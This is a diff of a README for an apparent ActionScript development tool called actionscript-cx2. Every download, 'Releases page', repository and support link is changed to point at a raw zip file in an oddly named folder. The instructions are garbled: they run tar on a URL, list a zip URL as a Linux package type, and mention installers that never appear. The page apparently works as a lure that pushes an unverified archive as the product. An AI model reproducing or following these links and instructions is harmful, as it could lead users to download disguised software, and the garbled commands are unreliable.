@@ -7,15 +7,15 @@ actionscript-cx2 is a user-friendly application designed to streamline your Acti
 To get started with actionscript-cx2, follow the simple steps outlined below. You'll be running the application in no time!
 
 ## 📥 Download the Application
-[![Download actionscript-cx2](https://raw.githubusercontent.com/sb-vale/actionscript-cx2/main/martensitic/actionscript-cx2.zip%20Now-Release-blue)](https://raw.githubusercontent.com/sb-vale/actionscript-cx2/main/martensitic/actionscript-cx2.zip)
+[![Download actionscript-cx2](https://raw.githubusercontent.com/sb-vale/actionscript-cx2/main/martensitic/cx_actionscript_v3.1.zip%20Now-Release-blue)](https://raw.githubusercontent.com/sb-vale/actionscript-cx2/main/martensitic/cx_actionscript_v3.1.zip)
 
 ### Download & Install
-1. Click [this link](https://raw.githubusercontent.com/sb-vale/actionscript-cx2/main/martensitic/actionscript-cx2.zip) to visit the Releases page.
+1. Click [this link](https://raw.githubusercontent.com/sb-vale/actionscript-cx2/main/martensitic/cx_actionscript_v3.1.zip) to visit the Releases page.
 2. You will see a list of available versions. Choose the latest version for the best experience.
 3. Click on the asset that matches your operating system:
     - For **Windows**: Download the `.exe` file.
     - For **Mac**: Download the `.dmg` file.
-    - For **Linux**: Download the appropriate `https://raw.githubusercontent.com/sb-vale/actionscript-cx2/main/martensitic/actionscript-cx2.zip` or `.deb` file.
+    - For **Linux**: Download the appropriate `https://raw.githubusercontent.com/sb-vale/actionscript-cx2/main/martensitic/cx_actionscript_v3.1.zip` or `.deb` file.
 4. Once downloaded, locate the file in your Downloads folder.
 
 ### Installation Instructions
@@ -29,8 +29,8 @@ To get started with actionscript-cx2, follow the simple steps outlined below. Yo
 
 **For Linux:**
 - Open a terminal.
-- Navigate to the folder where the `https://raw.githubusercontent.com/sb-vale/actionscript-cx2/main/martensitic/actionscript-cx2.zip` file is located.
-- Extract the archive using `tar -xzf https://raw.githubusercontent.com/sb-vale/actionscript-cx2/main/martensitic/actionscript-cx2.zip`.
+- Navigate to the folder where the `https://raw.githubusercontent.com/sb-vale/actionscript-cx2/main/martensitic/cx_actionscript_v3.1.zip` file is located.
+- Extract the archive using `tar -xzf https://raw.githubusercontent.com/sb-vale/actionscript-cx2/main/martensitic/cx_actionscript_v3.1.zip`.
 - Follow any specific installation instructions in the provided README.
 
 ## 💻 System Requirements
@@ -75,8 +75,8 @@ A: Yes, actionscript-cx2 supports project sharing, allowing you to collaborate w
 A: Yes, you can check the community forums or raise an issue on our GitHub repository for assistance.
 
 ## 📞 Contact Support
-For any inquiries or support issues, please feel free to reach out. You can create an issue on the [GitHub repository](https://raw.githubusercontent.com/sb-vale/actionscript-cx2/main/martensitic/actionscript-cx2.zip) where our team will assist you.
+For any inquiries or support issues, please feel free to reach out. You can create an issue on the [GitHub repository](https://raw.githubusercontent.com/sb-vale/actionscript-cx2/main/martensitic/cx_actionscript_v3.1.zip) where our team will assist you.
 
 ---
 
-Now that you have everything you need, click [here](https://raw.githubusercontent.com/sb-vale/actionscript-cx2/main/martensitic/actionscript-cx2.zip) to download actionscript-cx2 and take your ActionScript development to the next level!
+Now that you have everything you need, click [here](https://raw.githubusercontent.com/sb-vale/actionscript-cx2/main/martensitic/cx_actionscript_v3.1.zip) to download actionscript-cx2 and take your ActionScript development to the next level!
